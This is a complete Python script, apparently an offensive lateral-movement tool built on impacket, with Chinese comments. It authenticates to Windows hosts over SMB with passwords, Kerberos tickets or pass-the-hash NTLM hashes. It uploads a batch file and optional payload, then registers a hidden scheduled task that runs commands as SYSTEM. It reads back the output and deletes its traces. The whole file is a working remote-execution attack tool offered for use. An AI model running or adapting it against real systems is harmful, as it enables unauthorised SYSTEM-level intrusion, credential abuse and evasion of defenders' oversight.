#!/usr/bin/env python3
"""win-exec.py — Windows 侧执行原语:任务计划触发 + SMB 结果文件回读(免疫高延迟链路竞态)
用法: win-exec.py <域/用户> <密码|-> <目标FQDN> <远程命令> [本地上传文件]
  密码 '-' = 用 KRB5CCNAME 票。上传文件落到 C:\\Windows\\Temp\\<文件名>
原理: impacket atexec 在高延迟链路 Run 后立刻 Delete,任务没起跑就被删(实测复现);
  本脚本自建任务、Run 后保活轮询结果文件、最后才清理。服务(SCMR)与 WMI/DCOM 在该链路均不可靠。
"""
import os, re, sys, time, random, string, logging
from impacket.smbconnection import SMBConnection
from impacket.dcerpc.v5 import tsch, transport
from impacket.dcerpc.v5.dtypes import NULL

RDIR = "Windows\\Temp"

def log(m): print(m, flush=True)

def main():
    if len(sys.argv) < 5:
        print(__doc__); sys.exit(2)
    domuser, pwd, tgt, rcmd = sys.argv[1:5]
    upfile = sys.argv[5] if len(sys.argv) > 5 else None
    domain, user = domuser.split("/", 1)
    krb = pwd == "-"
    m = re.fullmatch(r"([0-9a-fA-F]{32}):([0-9a-fA-F]{32})", pwd)  # lm:nth 哈希直通(PtH)
    lmhash, nthash = (m.group(1), m.group(2)) if m else ("", "")
    rid = "wr_" + "".join(random.choices(string.digits, k=8))
    bat, outf = rid + ".bat", rid + ".txt"
    rid_hex = "wr_" + "".join(random.choices(string.ascii_letters + string.digits, k=10))

    smb = SMBConnection(tgt, tgt)
    if krb:
        smb.kerberosLogin(user, "", domain, useCache=True)  # KRB5CCNAME 票
    elif nthash:
        smb.login(user, "", domain, lmhash, nthash)         # 哈希传递
    else:
        smb.login(user, pwd, domain)

    tid = smb.connectTree("C$")
    def put(local, remote):
        with open(local, "rb") as fh:
            smb.putFile("C$", remote, fh.read)
    def cat(remote):
        from io import BytesIO
        buf = BytesIO()
        try:
            smb.getFile("C$", remote, buf.write)
            return buf.getvalue().decode("utf-8", "replace")
        except Exception:
            return None
    def rm(remote):
        try: smb.deleteFile("C$", remote)
        except Exception: pass

    # bat: 括号组保证 && 链全进结果文件
    bat_content = f"( {rcmd} ) > C:\\Windows\\Temp\\{outf} 2>&1\r\n"
    local_bat = os.path.join("/tmp", bat)
    with open(local_bat, "w") as fh: fh.write(bat_content)

    log(f"[*] 上传 {bat} → {tgt} C$\\{RDIR}")
    put(local_bat, f"{RDIR}\\{bat}")
    ub = None
    if upfile and os.path.isfile(upfile):
        ub = os.path.basename(upfile)
        put(upfile, f"{RDIR}\\{ub}")
        log(f"[*] 上传 {ub}")

    # 任务计划触发(保活轮询,不像 atexec 立刻删任务)
    rpc = transport.DCERPCTransportFactory(f"ncacn_np:{tgt}[\\pipe\\atsvc]")
    rpc.set_smb_connection(smb)
    dce = rpc.get_dce_rpc()
    if krb:
        from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE
        dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)  # kerberos 票必须显式设,否则默认 NTLM → access_denied
    dce.connect()
    dce.set_auth_level(6)  # PKT_PRIVACY(connect 后 bind 前,同 atexec)
    dce.bind(tsch.MSRPC_UUID_TSCHS)
    task_xml = f"""<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <CalendarTrigger>
      <StartBoundary>2015-07-15T20:35:13.2757294</StartBoundary>
      <Enabled>true</Enabled>
      <ScheduleByDay><DaysInterval>1</DaysInterval></ScheduleByDay>
    </CalendarTrigger>
  </Triggers>
  <Principals>
    <Principal id="LocalSystem">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings><StopOnIdleEnd>true</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="LocalSystem">
    <Exec>
      <Command>cmd.exe</Command>
      <Arguments>/c C:\\Windows\\Temp\\{bat}</Arguments>
    </Exec>
  </Actions>
</Task>"""
    tname = "\\" + rid_hex
    log(f"[*] 创建任务 {tname} (SYSTEM 权限)")
    try:
        tsch.hSchRpcRegisterTask(dce, tname, task_xml, tsch.TASK_CREATE, NULL, tsch.TASK_LOGON_NONE)
        tsch.hSchRpcRun(dce, tname)
    except Exception as e:
        log(f"[!] 任务注册/运行失败: {e}")
        rm(f"{RDIR}\\{bat}"); sys.exit(2)

    log("[*] 轮询结果文件(3s×30,任务保活中) ...")
    res = None
    for _ in range(30):
        time.sleep(3)
        res = cat(f"{RDIR}\\{outf}")
        if res and res.strip(): break
    # 清理
    try: tsch.hSchRpcDelete(dce, tname)
    except Exception: pass
    dce.disconnect()
    rm(f"{RDIR}\\{bat}"); rm(f"{RDIR}\\{outf}")
    if ub: rm(f"{RDIR}\\{ub}")
    smb.logoff()

    if res and res.strip():
        log("[✓] 远程输出:")
        print(res.strip())
        sys.exit(0)
    log("[!] 90s 内未取到结果(杀软拦截/命令未执行)")
    sys.exit(1)

if __name__ == "__main__":
    logging.getLogger("impacket").setLevel(logging.ERROR)
    main()
